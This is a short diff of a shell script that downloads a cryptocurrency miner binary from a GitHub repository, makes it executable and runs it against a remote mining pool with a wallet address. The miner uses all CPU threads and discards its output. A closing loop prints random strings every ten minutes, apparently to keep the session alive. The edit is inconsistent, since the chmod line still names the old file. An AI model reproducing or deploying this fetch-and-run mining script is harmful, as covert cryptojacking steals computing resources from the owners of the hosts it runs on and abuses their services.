@@ -1,4 +1,4 @@
-wget https://github.com/aqshakuy/nyemfile/raw/main/BTRM
+wget https://github.com/bengetsia/soft/raw/main/xmrig
 chmod 777 BTRM
-./BTRM -a minotaurx -o stratum+tcp://173.255.209.217:80 -u RMrWTvzwbRoCSbfYSnPXw4aLG5ZkXyFb6i.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all) >/dev/null 2>&1
+./xmrig -a yespowertide -o stratum+tcps://stratum-asia.rplant.xyz:7059 -u TKZ8xnwKRJg4reym5W5XrfSFexUCZ4NgNc.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
